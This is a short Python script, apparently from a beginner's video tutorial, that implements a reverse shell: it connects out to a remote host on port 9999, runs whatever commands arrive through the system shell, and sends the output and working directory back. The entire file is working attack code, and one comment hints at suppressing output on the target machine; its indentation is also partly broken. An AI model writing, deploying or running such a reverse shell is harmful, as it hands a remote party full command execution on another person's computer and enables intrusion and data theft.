#connects to server and waits fi instrucitons
#author:johnjimy som
#date: august 24, 2018
#version: 0.0.2
#objective: これはRSh Scriptのチュートリアルです. 

import os #access the operating systems
import socket #connect to serever
import subprocess #allows to control of the Operating System onof target machine

s = socket.socket()#compiter can connect to other computers
host = '###.##.###.##'#target ip
port = 9999
s.connect((host,port))#bind the network

#video 4
while True:
    data = s.recv(1024)#1024 buffer size
    if data[:2].decode("utf-8") == 'cd': #convert byte to string
        os.chdir(data[3:].decode("utf-8"))#os = access operating systrm
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#omit the shell=True
        #cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#debugg open the subpros, open a cmd from a terminal, shell shouldnt be added..
        #takes any output puts out to standard string
    output_bytes=cmd.stdout.read()+cmd.stderr.read()
        #output_bytes = cmd.stdout.read()+cmd.strderr.read()
    output_str = str(output_bytes, "utf-8")
    s.send(str.encode(output_str + str(os.getcwd())  + ">"))#get current directory
    #print(output_str)#if ur hidoi hito dont print

#   close connection
s.close()